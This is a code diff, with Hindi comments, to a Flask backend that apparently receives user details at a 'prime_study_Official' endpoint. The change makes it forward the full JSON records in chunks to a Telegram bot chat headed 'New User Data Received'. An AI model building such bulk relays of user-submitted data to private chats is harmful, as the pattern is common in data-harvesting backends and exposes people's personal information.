@@ -91,23 +91,58 @@ def should_block_request(app_signature, auth_token):
 
 
 def send_to_telegram(data):
-    """डेटा को टेलीग्राम बॉट के ज़रिए भेजने का फंक्शन"""
+    """डेटा को टेलीग्राम बॉट के ज़रिए भेजने का फंक्शन (लंबे डेटा को टुकड़ों में बाँटकर)"""
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     
     # JSON डेटा को अच्छे से फॉर्मेट करके स्ट्रिंग बनाना
     formatted_data = json.dumps(data, indent=2, ensure_ascii=False)
-    message = f"🚨 <b>New User Data Received</b> 🚨\n\n<pre>{formatted_data}</pre>"
     
-    payload = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "text": message[:4000], # Telegram की मेसेज लिमिट को ध्यान में रखते हुए
-        "parse_mode": "HTML"
-    }
+    # Telegram की अधिकतम सीमा 4096 है, सुरक्षित रहने के लिए हम 3900 का उपयोग करेंगे
+    MAX_CHUNK_SIZE = 3900
     
-    try:
-        requests.post(url, json=payload)
-    except Exception as e:
-        print("Telegram Error:", e)
+    # अगर डेटा छोटा है, तो एक ही बार में भेज दें
+    if len(formatted_data) <= MAX_CHUNK_SIZE:
+        message = f"🚨 <b>New User Data Received</b> 🚨\n\n<pre>{formatted_data}</pre>"
+        payload = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": message,
+            "parse_mode": "HTML"
+        }
+        try:
+            requests.post(url, json=payload)
+        except Exception as e:
+            print("Telegram Error:", e)
+    
+    # अगर डेटा बड़ा है, तो उसे टुकड़ों में बाँटकर भेजें
+    else:
+        # सबसे पहले एक हेडर मैसेज भेजें ताकि पता चले कि बड़ा डेटा आ रहा है
+        header_payload = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": "🚨 <b>New User Data Received (Large Data - Multiple Parts)</b> 🚨",
+            "parse_mode": "HTML"
+        }
+        try:
+            requests.post(url, json=header_payload)
+        except Exception as e:
+            print("Telegram Error (Header):", e)
+        
+        # अब डेटा को MAX_CHUNK_SIZE के हिसाब से टुकड़ों में बाँटें
+        for i in range(0, len(formatted_data), MAX_CHUNK_SIZE):
+            chunk = formatted_data[i : i + MAX_CHUNK_SIZE]
+            
+            # हर टुकड़े को <pre> टैग में रखना ज़रूरी है ताकि Telegram का HTML टूटे नहीं
+            message = f"<pre>{chunk}</pre>"
+            
+            payload = {
+                "chat_id": TELEGRAM_CHAT_ID,
+                "text": message,
+                "parse_mode": "HTML"
+            }
+            
+            try:
+                requests.post(url, json=payload)
+            except Exception as e:
+                print(f"Telegram Error (Part {i}):", e)
 
 @app.route('/user-details/prime_study_Official', methods=['POST'])
 def save_user_details():
